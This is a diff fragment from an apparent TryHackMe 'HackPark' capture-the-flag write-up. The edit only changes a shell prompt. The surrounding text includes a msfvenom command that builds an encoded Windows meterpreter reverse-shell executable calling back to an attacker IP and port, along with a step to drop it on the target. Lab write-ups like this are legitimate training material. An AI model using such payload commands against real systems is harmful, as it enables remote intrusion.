@@ -32,7 +32,7 @@ the exploit script tell us exackly what we should do
 
 current reverse shell is not so good, the plan is get **meterpreter** shell: let start by create the meterpreter shell using `msfvenom`:
 ```console
-kali@kali:~/THM/hackpark$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.14.151 LPORT=9696 -f exe -o shell2.exe
+bibo318@parrot:~/THM/hackpark$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.14.151 LPORT=9696 -f exe -o shell2.exe
 ```
 now in the restricted shell, move to any folder that you will have permission to download/save the our reverse shell (in my case, `c:\Users\Public\Documents`)
 
